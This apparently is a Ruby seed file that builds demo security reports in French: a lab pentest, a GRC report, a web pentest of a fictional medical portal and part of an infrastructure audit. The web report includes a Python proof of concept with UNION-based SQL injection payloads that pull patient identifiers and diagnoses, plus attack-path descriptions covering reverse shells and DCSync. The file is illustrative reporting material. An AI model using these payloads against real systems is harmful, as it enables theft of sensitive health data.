          { id: "delivery", label: "Delivery", color: "#e67e22", timestamp: "Jour 2 — 10:30", techniques: [
            { id: "T1190", name: "Exploit Public-Facing Application", status: "success" },
            { id: "T1566", name: "Phishing (tentative)", status: "blocked" }
          ]},
          { id: "exploit", label: "Exploitation", color: "#e74c3c", timestamp: "Jour 2 — 15:00", techniques: [
            { id: "T1059", name: "Command and Scripting Interpreter", status: "success" },
            { id: "T1068", name: "Exploitation for Privilege Escalation", status: "success" }
          ]},
          { id: "c2", label: "Command & Control", color: "#8e44ad", timestamp: "Jour 3 — 08:00", techniques: [
            { id: "T1071", name: "Application Layer Protocol", status: "success" }
          ]},
          { id: "actions", label: "Actions on Objectives", color: "#c0392b", timestamp: "Jour 3 — 16:00", techniques: [
            { id: "T1003", name: "OS Credential Dumping (DCSync)", status: "success" },
            { id: "T1048", name: "Exfiltration Over C2 Channel", status: "partial" }
          ]}
        ]
      }
    },
    {
      id: "b_demo_p09", type: "attack-path", children: [],
      data: {
        title: "Chemin d'attaque vers Domain Admin",
        nodes: [
          { id: "1", label: "Attaquant", type: "entry", color: "#3498db" },
          { id: "2", label: "Web Server", type: "server", color: "#e67e22" },
          { id: "3", label: "App Server", type: "server", color: "#e74c3c" },
          { id: "4", label: "DB Server", type: "database", color: "#9b59b6" },
          { id: "5", label: "DC (LLDAP01)", type: "target", color: "#c0392b" }
        ],
        edges: [
          { source: "1", target: "2", label: "SQLi via port 443" },
          { source: "2", target: "3", label: "Reverse shell" },
          { source: "3", target: "4", label: "DB creds (config)" },
          { source: "4", target: "5", label: "DCSync (GenericAll)" }
        ]
      }
    },
    {
      id: "b_demo_p10", type: "privilege-escalation", children: [],
      data: {
        title: "Chaîne d'escalade de privilèges",
        chain: [
          { id: "1", level: 0, privilege: "Anonymous (Web)", description: "Accès public au portail web via HTTPS", color: "#3498db", source: "Port 443 ouvert" },
          { id: "2", level: 1, privilege: "www-data", description: "Exécution de code via injection SQL dans le formulaire login", color: "#e67e22", source: "CVE custom — SQLi" },
          { id: "3", level: 2, privilege: "svc_sql (service)", description: "Credentials MySQL trouvées dans le fichier de config", color: "#9b59b6", source: "Cleartext creds /etc/app/db.conf" },
          { id: "4", level: 3, privilege: "apopov (Domain User)", description: "Réutilisation du mot de passe svc_sql sur le compte AD", color: "#e74c3c", source: "Password reuse" },
          { id: "5", level: 4, privilege: "Domain Admin", description: "GenericAll sur Domain Admins → ajout au groupe", color: "#c0392b", source: "ACL misconfiguration (BloodHound)" }
        ]
      }
    },
    {
      id: "b_demo_p11", type: "recommendation", children: [],
      data: {
        title: "Déployer l'authentification multi-facteurs (MFA)",
        priority: "critical", effort: 3, impact: 5,
        description: "Implémenter le MFA sur tous les comptes à privilèges (Domain Admins, service accounts, VPN) et progressivement sur tous les utilisateurs du domaine.",
        businessValue: "Réduction de 99.9% des attaques par credential stuffing et de 80% des mouvements latéraux basés sur le vol de credentials.",
        tools: [
          { name: "Microsoft Authenticator", type: "commercial", cost: "free" },
          { name: "Duo Security", type: "commercial", cost: "paid" },
          { name: "YubiKey", type: "hardware", cost: "paid" }
        ],
        timeline: "Q2 2024", owner: "Équipe IAM"
      }
    },
    {
      id: "b_demo_p12", type: "recommendation", children: [],
      data: {
        title: "Segmenter le réseau avec des VLANs",
        priority: "high", effort: 4, impact: 4,
        description: "Créer des segments réseau dédiés (IT, Users, Servers, DMZ) avec filtrage inter-VLAN strict. Isoler les serveurs critiques (DC, DB) dans un VLAN dédié.",
        businessValue: "Limiter la propagation latérale en cas de compromission. Réduire la surface d'attaque de 60%.",
        tools: [{ name: "pfSense", type: "open-source", cost: "free" }],
        timeline: "Q3 2024", owner: "Équipe Réseau"
      }
    },
    {
      id: "b_demo_030", type: "section-title", children: [],
      data: { text: "Annexes", level: 3 }
    },
    {
      id: "b_demo_031", type: "text", children: [],
      data: { content: "Les captures d'écran détaillées, les logs complets de <code class=\"arbor-cartouche\">Mimikatz</code> et les rapports <code class=\"arbor-cartouche\">PingCastle</code> sont disponibles dans le dossier partagé sécurisé. Mot de passe communiqué par canal séparé." }
    },
    {
      id: "b_demo_032", type: "separator", children: [],
      data: { style: "space" }
    },
    {
      id: "b_demo_033", type: "image", children: [],
      data: {
        images: [
          { url: "https://upload.wikimedia.org/wikipedia/commons/d/de/20231209_12_54_44-Neofetch_CMD_crop.png", caption: "PingCastle — Score global du domaine" }
        ],
        magnification: false
      }
    }
  ]
}

Report.where(title: "Pentest ZeroLab — Demo").destroy_all

Report.create!(
  title: "Pentest ZeroLab — Demo",
  report_type: :pentest,
  content: demo_content,
  accent_color: "#C792EA"
)

puts "✓ Demo report created"

# ─── GRC Demo Report ──────────────────────────────────────────────────
grc_content = {
  blocks: [
    {
      id: "b_grc_00", type: "section-title", children: [],
      data: { text: "Rapport GRC — Gouvernance, Risques, Conformité", level: 1 }
    },
    {
      id: "b_grc_01", type: "text", children: [],
      data: { content: "Ce rapport présente l'état de la gouvernance, des risques et de la conformité de l'organisation. Il couvre l'analyse EBIOS RM, les registres de risques, les plans d'action et les matrices de contrôle." }
    },

    # ── EBIOS RM ──
    {
      id: "b_grc_02", type: "section-title", children: [],
      data: { text: "1. Analyse EBIOS RM", level: 2 }
    },
    {
      id: "b_grc_03", type: "ebios-target", children: [],
      data: {
        title: "Cible EBIOS RM",
        view: "both",
        niveaux: [
          { label: "1", couleur: "#27ae60" },
          { label: "2", couleur: "#f1c40f" },
          { label: "3", couleur: "#e67e22" },
          { label: "4", couleur: "#e74c3c" }
        ],
        sources: [
          { nom: "SR1", label: "Cybercriminel organisé", couleur: "#e74c3c" },
          { nom: "SR2", label: "Concurrent", couleur: "#e67e22" },
          { nom: "SR3", label: "Hacktiviste", couleur: "#9b59b6" }
        ],
        objectifs: [
          { nom: "OV1", label: "Données clients", couleur: "#2980b9" },
          { nom: "OV2", label: "SI interne", couleur: "#27ae60" },
          { nom: "OV3", label: "Image de marque", couleur: "#f39c12" }
        ],
        couples: [
          { nom: "C1", source: "SR1", objectif: "OV1", pertinence: 4, retenu: true },
          { nom: "C2", source: "SR1", objectif: "OV2", pertinence: 3, retenu: true },
          { nom: "C3", source: "SR2", objectif: "OV1", pertinence: 2, retenu: false },
          { nom: "C4", source: "SR2", objectif: "OV3", pertinence: 3, retenu: true },
          { nom: "C5", source: "SR3", objectif: "OV3", pertinence: 1, retenu: false }
        ],
        apparence: {
          couleurRetenu: "#2980B9",
          couleurNonRetenu: "#95A5A6"
        }
      }
    },
    {
      id: "b_grc_04", type: "ebios-feared-events", children: [],
      data: {
        title: "Événements Redoutés",
        events: [
          { id: "EV001", essentialValue: "Données clients", fearedEvent: "Vol de données confidentielles", severity: 4, impactType: "Confidentialité", source: "Groupe APT" },
          { id: "EV002", essentialValue: "Service web", fearedEvent: "Indisponibilité >4h", severity: 3, impactType: "Disponibilité", source: "Cybercriminel" },
          { id: "EV003", essentialValue: "Intégrité données", fearedEvent: "Altération malveillante", severity: 3, impactType: "Intégrité", source: "Insider" },
          { id: "EV004", essentialValue: "Infrastructure", fearedEvent: "Compromission serveur critique", severity: 4, impactType: "Confidentialité + Disponibilité", source: "Groupe cybercriminel" }
        ]
      }
    },
    {
      id: "b_grc_05", type: "ebios-scenarios", children: [],
      data: {
        title: "Scénarios de Risque",
        scenarios: [
          { id: "SC001", name: "Compromission accès admin", type: "operational", likelihood: 3, severity: 4, inherentRisk: "Élevé", treatment: "reduce", mitigations: ["MFA admin", "Audit logs temps réel", "Segmentation réseau"], owner: "CISO" },
          { id: "SC002", name: "Attaque DDoS massive", type: "strategic", likelihood: 2, severity: 3, inherentRisk: "Moyen", treatment: "accept", mitigations: ["PCA", "Contrat anti-DDoS"], owner: "Resp. Infra" },
          { id: "SC003", name: "Fuite de données insider", type: "operational", likelihood: 2, severity: 4, inherentRisk: "Élevé", treatment: "reduce", mitigations: ["DLP", "Moindres privilèges"], owner: "Resp. Sécurité" }
        ]
      }
    },

    # ── Risques ──
    {
      id: "b_grc_06", type: "section-title", children: [],
      data: { text: "2. Registre des Risques", level: 2 }
    },
    {
      id: "b_grc_07", type: "risk-register", children: [],
      data: {
        title: "Registre des Risques",
        risks: [
          { id: "RISK001", name: "Incident de sécurité majeur", category: "Cybersécurité", likelihood: 3, impact: 5, inherentRisk: 15, controls: ["MFA", "SIEM", "Segmentation"], residualRisk: 6, residualLevel: "Moyen", owner: "CISO", status: "active", treatmentPlan: "Déployer EDR Q3" },
          { id: "RISK002", name: "Indisponibilité de service", category: "Infrastructure", likelihood: 2, impact: 4, inherentRisk: 8, controls: ["DR plan", "Backup auto"], residualRisk: 3, residualLevel: "Faible", owner: "Infra Manager", status: "mitigated", treatmentPlan: "RTO 1h assuré" },
          { id: "RISK003", name: "Non-conformité RGPD", category: "Conformité", likelihood: 2, impact: 4, inherentRisk: 8, controls: ["DPO", "Consent mgmt"], residualRisk: 4, residualLevel: "Faible", owner: "DPO", status: "active", treatmentPlan: "Audit Q2" }
        ]
      }
    },
    {
      id: "b_grc_08", type: "risk-appetite", children: [],
      data: {
        title: "Appétit au Risque",
        description: "Zones : Acceptable (vert) / Tolérable (jaune) / Inacceptable (rouge)",
        categories: [
          { id: "CAT1", name: "Cybersécurité", current: 35, appetite: 40, max: 100, status: "acceptable" },
          { id: "CAT2", name: "Conformité", current: 15, appetite: 20, max: 100, status: "acceptable" },
          { id: "CAT3", name: "Opérationnel", current: 55, appetite: 60, max: 100, status: "tolerable" },
          { id: "CAT4", name: "Financier", current: 72, appetite: 70, max: 100, status: "unacceptable" },
          { id: "CAT5", name: "Réputation", current: 20, appetite: 30, max: 100, status: "acceptable" }
        ]
      }
    },

    # ── Maturité ──
    {
      id: "b_grc_09", type: "section-title", children: [],
      data: { text: "3. Maturité & Conformité", level: 2 }
    },
    {
      id: "b_grc_10", type: "maturity-radar", children: [],
      data: {
        title: "Radar de Maturité Sécurité",
        axes: [
          { label: "Gouvernance", current: 2, target: 4, max: 5 },
          { label: "Risques", current: 3, target: 4, max: 5 },
          { label: "Processus", current: 2, target: 4, max: 5 },
          { label: "Ressources", current: 3, target: 4, max: 5 },
          { label: "Technologie", current: 2, target: 4, max: 5 },
          { label: "Incidents", current: 1, target: 4, max: 5 },
          { label: "Conformité", current: 2, target: 4, max: 5 },
          { label: "Culture", current: 2, target: 4, max: 5 }
        ],
        currentColor: "#E8A855",
        targetColor: "#5B8FD4"
      }
    },
    {
      id: "b_grc_11", type: "gap-analysis", children: [],
      data: {
        title: "Analyse d'écart",
        framework: "nist-csf",
        domains: [
          { id: "D1", name: "Gouvernance", currentLevel: 2, targetLevel: 4, gap: 2, priority: "high", owner: "CISO" },
          { id: "D2", name: "Identité & Accès", currentLevel: 3, targetLevel: 4, gap: 1, priority: "medium", owner: "IAM Manager" },
          { id: "D3", name: "Sécurité des données", currentLevel: 2, targetLevel: 5, gap: 3, priority: "critical", owner: "DPO" },
          { id: "D4", name: "Détection & Réponse", currentLevel: 1, targetLevel: 4, gap: 3, priority: "critical", owner: "SOC Manager" }
        ]
      }
    },
    {
      id: "b_grc_12", type: "compliance-checklist", children: [],
      data: {
        title: "Checklist ISO 27001",
        framework: "iso-27001",
        sections: [
          { id: "A5", title: "Contrôles d'organisation", controls: [
            { id: "A.5.1", description: "Politiques de sécurité", status: "compliant", notes: "v2.1 approuvée" },
            { id: "A.5.2", description: "Structure et responsabilités", status: "compliant", notes: "RACI défini" },
            { id: "A.5.3", description: "Séparation des responsabilités", status: "partial", notes: "En cours" }
          ]},
          { id: "A8", title: "Gestion des actifs", controls: [
            { id: "A.8.1", description: "Inventaire des actifs", status: "compliant", notes: "CMDB opérationnelle" },
            { id: "A.8.2", description: "Propriété des actifs", status: "non-compliant", notes: "Legacy non assigné" }
          ]}
        ]
      }
    },
    {
      id: "b_grc_13", type: "compliance-gauge", children: [],
      data: {
        title: "Conformité ISO 27001",
        overallCompliance: 72,
        domains: [
          { id: "D1", name: "Organisation", compliance: 85, controlsTotal: 5, controlsCompliant: 4 },
          { id: "D2", name: "Actifs", compliance: 60, controlsTotal: 4, controlsCompliant: 2 },
          { id: "D3", name: "Opérations", compliance: 68, controlsTotal: 8, controlsCompliant: 5 },
          { id: "D4", name: "Communications", compliance: 80, controlsTotal: 3, controlsCompliant: 2 }
        ],
        lastAudit: "2024-01-15",
        nextAudit: "2024-07-15",
        trend: "improving"
      }
    },

    # ── Gouvernance ──
    {
      id: "b_grc_14", type: "section-title", children: [],
      data: { text: "4. Gouvernance & Actions", level: 2 }
    },
    {
      id: "b_grc_15", type: "raci-matrix", children: [],
      data: {
        title: "Matrice RACI — Processus de Sécurité",
        tasks: [
          { id: "T1", task: "Gestion des incidents" },
          { id: "T2", task: "Politique de sécurité" },
          { id: "T3", task: "Audit interne" },
          { id: "T4", task: "Gestion des vulnérabilités" },
          { id: "T5", task: "Plan de continuité" }
        ],
        stakeholders: [
          { id: "S1", name: "CISO" },
          { id: "S2", name: "IT Manager" },
          { id: "S3", name: "Resp. Sécu" },
          { id: "S4", name: "DPO" }
        ],
        assignments: [
          { task: "T1", stakeholder: "S1", role: "A" },
          { task: "T1", stakeholder: "S2", role: "R" },
          { task: "T1", stakeholder: "S3", role: "C" },
          { task: "T2", stakeholder: "S1", role: "R" },
          { task: "T2", stakeholder: "S4", role: "I" },
          { task: "T3", stakeholder: "S3", role: "A" },
          { task: "T3", stakeholder: "S2", role: "R" },
          { task: "T4", stakeholder: "S3", role: "R" },
          { task: "T4", stakeholder: "S1", role: "A" },
          { task: "T5", stakeholder: "S2", role: "R" },
          { task: "T5", stakeholder: "S1", role: "C" }
        ]
      }
    },
    {
      id: "b_grc_16", type: "control-matrix", children: [],
      data: {
        title: "Matrice d'Efficacité des Contrôles",
        controls: [
          { id: "C001", name: "MFA", type: "preventive", frequency: "Continu", effectiveness: 5 },
          { id: "C002", name: "Monitoring", type: "detective", frequency: "Temps réel", effectiveness: 4 },
          { id: "C003", name: "Patching", type: "preventive", frequency: "Mensuel", effectiveness: 4 },
          { id: "C004", name: "Incident Response", type: "corrective", frequency: "À la demande", effectiveness: 3 }
        ],
        threats: [
          { id: "TH1", name: "Compromission" },
          { id: "TH2", name: "Vulnérabilité" },
          { id: "TH3", name: "Fuite données" }
        ],
        coverage: [
          { control: "C001", threat: "TH1", effectiveness: 5 },
          { control: "C001", threat: "TH2", effectiveness: 1 },
          { control: "C002", threat: "TH1", effectiveness: 4 },
          { control: "C002", threat: "TH3", effectiveness: 5 },
          { control: "C003", threat: "TH2", effectiveness: 4 },
          { control: "C004", threat: "TH3", effectiveness: 3 }
        ]
      }
    },
    {
      id: "b_grc_17", type: "action-plan", children: [],
      data: {
        title: "Plan d'Action Sécurité 2024",
        actions: [
          { id: "ACT001", action: "Déployer MFA admin", responsible: "IAM", deadline: "2024-06-30", priority: "critical", status: "in-progress", progress: 65, quarter: "Q2" },
          { id: "ACT002", action: "SOC 24/7", responsible: "SOC", deadline: "2024-09-30", priority: "high", status: "in-progress", progress: 40, quarter: "Q3" },
          { id: "ACT003", action: "Audit ISO 27001", responsible: "CISO", deadline: "2024-04-30", priority: "high", status: "todo", progress: 0, quarter: "Q2" },
          { id: "ACT004", action: "Sensibilisation phishing", responsible: "Formation", deadline: "2024-05-31", priority: "medium", status: "done", progress: 100, quarter: "Q2" },
          { id: "ACT005", action: "XDR endpoints", responsible: "Ops", deadline: "2024-12-31", priority: "high", status: "todo", progress: 0, quarter: "Q4" }
        ]
      }
    }
  ]
}

Report.where(title: "Rapport GRC — Demo").destroy_all

Report.create!(
  title: "Rapport GRC — Demo",
  report_type: :grc,
  content: grc_content,
  accent_color: "#5B8FD4"
)

puts "✓ GRC demo report created"

# ─── Pentest Web Application Report ──────────────────────────────────
webapp_content = {
  blocks: [
    {
      id: "bw_001", type: "section-title", children: [],
      data: { text: "Pentest Application Web — MediPortal", level: 1 }
    },
    {
      id: "bw_002", type: "text", children: [],
      data: { content: "Rapport de test d'intrusion réalisé sur l'application web <code class=\"arbor-cartouche\">MediPortal v3.2</code>, plateforme de gestion des dossiers patients utilisée par 12 établissements de santé en France. L'audit a été conduit en mode <code class=\"arbor-cartouche\">grey-box</code> sur la période du 10 au 21 mars 2026." }
    },
    {
      id: "bw_003", type: "separator", children: [], data: { style: "line" }
    },

    # ── Scope ──
    {
      id: "bw_004", type: "section-title", children: [],
      data: { text: "1. Périmètre de l'audit", level: 2 }
    },
    {
      id: "bw_005", type: "scope-block", children: [],
      data: {
        title: "Périmètre MediPortal",
        inScope: [
          { target: "portal.mediportal.fr", type: "web", description: "Application principale (React + API)" },
          { target: "api.mediportal.fr", type: "api", description: "API REST v3 — 47 endpoints" },
          { target: "auth.mediportal.fr", type: "web", description: "Service d'authentification OIDC" },
          { target: "cdn.mediportal.fr", type: "web", description: "CDN assets statiques" }
        ],
        outOfScope: [
          { target: "*.mediportal.internal", type: "network", description: "Réseau interne back-office" },
          { target: "smtp.mediportal.fr", type: "service", description: "Serveur mail interne" }
        ],
        notes: "Tests limités aux heures ouvrées (8h-20h). Aucune attaque DoS autorisée."
      }
    },
    {
      id: "bw_006", type: "callout", children: [],
      data: { variant: "warning", content: "L'application traite des données de santé soumises au référentiel <code class=\"arbor-cartouche\">HDS</code> et au <code class=\"arbor-cartouche\">RGPD</code>. Toute vulnérabilité touchant les données patients est classée Critique." }
    },

    # ── Findings summary ──
    {
      id: "bw_007", type: "section-title", children: [],
      data: { text: "2. Synthèse des vulnérabilités", level: 2 }
    },
    {
      id: "bw_008", type: "findings-summary", children: [],
      data: { title: "Répartition par sévérité", critical: 3, high: 7, medium: 11, low: 5, info: 8, showPercentage: true }
    },
    {
      id: "bw_009", type: "horizontal-div", children: [
        {
          id: "bw_009a", type: "pie-chart", children: [],
          data: {
            title: "Par catégorie OWASP",
            items: [
              { label: "Injection", value: 4, color: "#e74c3c" },
              { label: "Broken Auth", value: 3, color: "#e67e22" },
              { label: "XSS", value: 5, color: "#f39c12" },
              { label: "SSRF", value: 2, color: "#9b59b6" },
              { label: "IDOR", value: 6, color: "#2980b9" },
              { label: "Misc Config", value: 4, color: "#27ae60" }
            ],
            donut: true
          }
        },
        {
          id: "bw_009b", type: "bar-chart", children: [],
          data: {
            title: "Vulnérabilités par composant",
            orientation: "horizontal",
            showValues: true,
            items: [
              { label: "API REST", value: 12, color: "#e74c3c" },
              { label: "Frontend", value: 6, color: "#e67e22" },
              { label: "Auth OIDC", value: 4, color: "#f39c12" },
              { label: "CDN", value: 2, color: "#27ae60" }
            ]
          }
        }
      ],
      data: {}
    },

    # ── CVE Table ──
    {
      id: "bw_010", type: "section-title", children: [],
      data: { text: "3. Vulnérabilités détaillées", level: 2 }
    },
    {
      id: "bw_011", type: "cve-table", children: [],
      data: {
        title: "CVE identifiées",
        cves: [
          { id: "CVE-2025-29813", description: "Azure DevOps Server Elevation of Privilege", cvss: 10.0, severity: "critical", vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", affected: "Pipeline CI/CD", remediationStatus: "pending" },
          { id: "CVE-2025-24054", description: "NTLM Hash Disclosure Spoofing", cvss: 6.5, severity: "medium", vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", affected: "Auth service", remediationStatus: "mitigated" },
          { id: "CVE-2024-38124", description: "Windows Netlogon Elevation of Privilege", cvss: 9.0, severity: "critical", vector: "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", affected: "Backend Auth", remediationStatus: "pending" },
          { id: "CVE-2025-21298", description: "Windows OLE Remote Code Execution", cvss: 9.8, severity: "critical", vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", affected: "Document parser", remediationStatus: "fixed" }
        ]
      }
    },

    # ── Vulnerability Cards ──
    {
      id: "bw_012", type: "vulnerability-card", children: [],
      data: {
        title: "SQL Injection — Endpoint recherche patients",
        severity: "critical",
        cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        description: "L'endpoint <code>GET /api/v3/patients?search=</code> est vulnérable à une injection SQL de type UNION-based. Le paramètre `search` est directement concaténé dans la requête PostgreSQL sans sanitisation. L'exploitation permet l'extraction complète de la base patients (850 000 dossiers).",
        remediation: "Utiliser des requêtes paramétrées (prepared statements). Implémenter un WAF avec rules OWASP CRS. Auditer tous les endpoints acceptant des paramètres de recherche.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html"],
        tags: ["OWASP-A03", "CWE-89", "HDS-Critical"]
      }
    },
    {
      id: "bw_013", type: "vulnerability-card", children: [],
      data: {
        title: "Broken Access Control — IDOR sur dossiers patients",
        severity: "high",
        cvss: 8.1,
        vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        description: "Les endpoints <code>GET /api/v3/patients/{id}</code> et <code>PATCH /api/v3/patients/{id}</code> ne vérifient pas que l'utilisateur authentifié a le droit d'accéder au dossier demandé. Un médecin peut lire/modifier les dossiers de patients d'autres établissements.",
        remediation: "Implémenter un contrôle d'accès basé sur l'établissement d'appartenance. Ajouter un middleware de vérification de périmètre.",
        references: ["https://owasp.org/www-community/attacks/IDOR"],
        tags: ["OWASP-A01", "CWE-639"]
      }
    },

    # ── CVSS Calculator ──
    {
      id: "bw_014", type: "cvss-calculator", children: [],
      data: { title: "Calcul CVSS — SQLi Recherche Patients", AV: "N", AC: "L", PR: "L", UI: "N", S: "U", C: "H", I: "H", A: "H" }
    },

    # ── Attack Path ──
    {
      id: "bw_015", type: "section-title", children: [],
      data: { text: "4. Scénario d'attaque", level: 2 }
    },
    {
      id: "bw_016", type: "attack-path", children: [],
      data: {
        title: "Chemin d'exploitation — De l'accès médecin à l'exfiltration",
        nodes: [
          { id: "n1", label: "Compte médecin", x: 50, y: 150, type: "start" },
          { id: "n2", label: "SQLi /patients", x: 220, y: 80, type: "exploit" },
          { id: "n3", label: "IDOR dossiers", x: 220, y: 220, type: "exploit" },
          { id: "n4", label: "Dump BDD", x: 400, y: 80, type: "impact" },
          { id: "n5", label: "Token admin", x: 400, y: 220, type: "exploit" },
          { id: "n6", label: "Accès complet", x: 560, y: 150, type: "impact" }
        ],
        edges: [
          { from: "n1", to: "n2", label: "Injection SQL" },
          { from: "n1", to: "n3", label: "Enum IDOR" },
          { from: "n2", to: "n4", label: "UNION SELECT" },
          { from: "n3", to: "n5", label: "Leak token" },
          { from: "n4", to: "n6", label: "850K dossiers" },
          { from: "n5", to: "n6", label: "Élévation" }
        ]
      }
    },
    {
      id: "bw_017", type: "attack-timeline", children: [],
      data: {
        title: "Kill Chain — MITRE ATT&CK",
        phases: [
          { name: "Reconnaissance", description: "Enumération des endpoints API via Swagger exposé", techniques: ["T1595.002", "T1592"], color: "#5B8FD4" },
          { name: "Initial Access", description: "Exploitation SQLi sur endpoint /patients?search=", techniques: ["T1190"], color: "#27ae60" },
          { name: "Privilege Escalation", description: "Récupération token admin via IDOR", techniques: ["T1078.004"], color: "#f39c12" },
          { name: "Collection", description: "Extraction massive des dossiers patients", techniques: ["T1530"], color: "#e67e22" },
          { name: "Exfiltration", description: "Exfiltration via API REST légitime avec token volé", techniques: ["T1567.002"], color: "#e74c3c" }
        ]
      }
    },

    # ── Code PoC ──
    {
      id: "bw_018", type: "code", children: [],
      data: {
        language: "python",
        code: "# PoC — SQL Injection UNION-based\nimport requests\n\nsession = requests.Session()\nsession.headers['Authorization'] = 'Bearer <medecin_token>'\n\n# Step 1: Determine number of columns\npayload = \"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--\"\nr = session.get(f'https://api.mediportal.fr/v3/patients?search={payload}')\n\n# Step 2: Extract patient data\npayload = \"' UNION SELECT id,nom,prenom,nss,diagnostic,NULL FROM patients--\"\nr = session.get(f'https://api.mediportal.fr/v3/patients?search={payload}')\nprint(f'Extracted {len(r.json())} patient records')"
      }
    },

    # ── Risk Assessment ──
    {
      id: "bw_019", type: "section-title", children: [],
      data: { text: "5. Évaluation des risques", level: 2 }
    },
    {
      id: "bw_020", type: "risk-matrix", children: [],
      data: {
        title: "Matrice de risque OWASP",
        xAxis: { label: "Vraisemblance", values: ["Faible", "Moyen", "Élevé", "Critique"] },
        yAxis: { label: "Impact", values: ["Faible", "Moyen", "Élevé", "Critique"] },
        points: [
          { label: "SQLi", x: 0.9, y: 0.95 },
          { label: "IDOR", x: 0.8, y: 0.75 },
          { label: "XSS Stored", x: 0.6, y: 0.5 }
        ]
      }
    },
    {
      id: "bw_021", type: "risk-assessment", children: [],
      data: {
        title: "Évaluation OWASP détaillée — SQLi",
        likelihood: {
          skillLevel: 8, motive: 9, opportunity: 7, size: 6,
          easeOfDiscovery: 8, easeOfExploit: 9, awareness: 7, intrusionDetection: 4
        },
        impact: {
          lossOfConfidentiality: 9, lossOfIntegrity: 7,
          lossOfAvailability: 3, lossOfAccountability: 6,
          financialDamage: 9, reputationDamage: 9,
          nonCompliance: 9, privacyViolation: 9
        }
      }
    },

    # ── Recommendations ──
    {
      id: "bw_022", type: "section-title", children: [],
      data: { text: "6. Recommandations", level: 2 }
    },
    {
      id: "bw_023", type: "recommendation", children: [],
      data: {
        title: "Implémenter des requêtes paramétrées sur toute l'API",
        priority: "P1",
        effort: "Moyen",
        impact: "Critique",
        description: "Remplacer toutes les concaténations SQL par des prepared statements. Auditer les 47 endpoints de l'API REST v3.",
        businessValue: "Élimine le risque d'extraction de 850 000 dossiers patients (amende CNIL potentielle > 4% CA).",
        tools: ["SonarQube", "Semgrep", "SQLMap"],
        timeline: "2 semaines",
        owner: "Équipe Backend"
      }
    },
    {
      id: "bw_024", type: "recommendation", children: [],
      data: {
        title: "Contrôle d'accès par établissement sur les endpoints patients",
        priority: "P1",
        effort: "Élevé",
        impact: "Élevé",
        description: "Ajouter un middleware de vérification du périmètre établissement sur tous les endpoints /patients/*.",
        businessValue: "Conformité HDS et RGPD — protection des données de santé inter-établissements.",
        tools: ["Casbin", "OPA"],
        timeline: "3 semaines",
        owner: "Architecte Sécurité"
      }
    },
    {
      id: "bw_025", type: "score-gauge", children: [],
      data: {
        title: "Facteurs de risque — Synthèse",
        scores: [
          { label: "Exposition externe", value: 8 },
          { label: "Criticité données", value: 9 },
          { label: "Maturité sécurité", value: 4 },
          { label: "Détection", value: 3 },
          { label: "Conformité HDS", value: 5 }
        ],
        max: 10
      }
    }
  ]
}

Report.where(title: "Pentest Web — MediPortal").destroy_all
Report.create!(
  title: "Pentest Web — MediPortal",
  report_type: :pentest,
  content: webapp_content,
  accent_color: "#E8A855"
)
puts "✓ Pentest Web report created"

# ─── Network & Infrastructure Audit Report ────────────────────────────
infra_content = {
  blocks: [
    {
      id: "bi_001", type: "section-title", children: [],
      data: { text: "Audit Infrastructure — DataForge SAS", level: 1 }
    },
    {
      id: "bi_002", type: "text", children: [],
      data: { content: "Rapport d'audit de l'infrastructure réseau et serveurs de <code class=\"arbor-cartouche\">DataForge SAS</code>. L'audit couvre le datacenter principal (<code class=\"arbor-cartouche\">DC-PAR1</code>), l'infrastructure cloud <code class=\"arbor-cartouche\">AWS eu-west-3</code>, et les interconnexions VPN avec les 3 sites distants." }
    },
    {
      id: "bi_003", type: "separator", children: [], data: { style: "line" }
    },

    # ── Scope ──
    {
      id: "bi_004", type: "section-title", children: [],
      data: { text: "1. Périmètre audité", level: 2 }
    },
    {
      id: "bi_005", type: "scope-block", children: [],
      data: {
        title: "Périmètre réseau DataForge",
        inScope: [
          { target: "10.10.0.0/16", type: "network", description: "Réseau datacenter DC-PAR1 (432 hôtes)" },
          { target: "172.16.0.0/12", type: "network", description: "VPN sites distants (Lyon, Marseille, Nantes)" },
          { target: "vpc-0a1b2c3d", type: "cloud", description: "AWS VPC Production eu-west-3" },
          { target: "fw-edge-01/02", type: "device", description: "Pare-feu périmétrique Fortinet" }
        ],
        outOfScope: [
          { target: "Postes utilisateurs", type: "endpoint", description: "Hors périmètre — audit séparé prévu Q3" }
        ],
        notes: "Scan Nessus autorisé 24/7. Tests d'intrusion limités aux heures creuses (22h-6h)."
      }
    },

    # ── Server Inventory (table) ──
    {
      id: "bi_006", type: "section-title", children: [],
      data: { text: "2. Inventaire serveurs", level: 2 }
    },
    {
      id: "bi_007", type: "table", children: [],
      data: {
        headers: ["Hostname", "Rôle", "OS", "IP", "Criticité"],
        rows: [
          ["SRV-DC01", "AD Domain Controller", "Windows Server 2022", "10.10.1.10", "Critique"],
          ["SRV-DC02", "AD Secondary DC", "Windows Server 2022", "10.10.1.11", "Critique"],
          ["SRV-SQL01", "Base de données prod", "Ubuntu 22.04 + PostgreSQL 15", "10.10.2.20", "Critique"],
          ["SRV-WEB01", "Serveur web frontend", "Ubuntu 22.04 + Nginx", "10.10.3.10", "Élevé"],
          ["SRV-WEB02", "Serveur web backend API", "Ubuntu 22.04 + Node.js", "10.10.3.11", "Élevé"],
          ["SRV-MON01", "Monitoring Grafana/Prometheus", "Debian 12", "10.10.4.50", "Moyen"],
          ["SRV-BACKUP", "Serveur backup Veeam", "Windows Server 2022", "10.10.5.100", "Élevé"],
          ["SRV-JUMP", "Bastion SSH", "Ubuntu 22.04", "10.10.1.5", "Critique"]
        ]
      }
    },
    {
      id: "bi_008", type: "callout", children: [],
      data: { variant: "danger", content: "Le serveur <code class=\"arbor-cartouche\">SRV-SQL01</code> expose PostgreSQL sur le port <code class=\"arbor-cartouche\">5432</code> sans restriction réseau. Accessible depuis tous les VLANs." }
    },

    # ── Scan Results ──
    {
      id: "bi_009", type: "section-title", children: [],
      data: { text: "3. Résultats de scan", level: 2 }
    },
    {
      id: "bi_010", type: "horizontal-div", children: [
        {
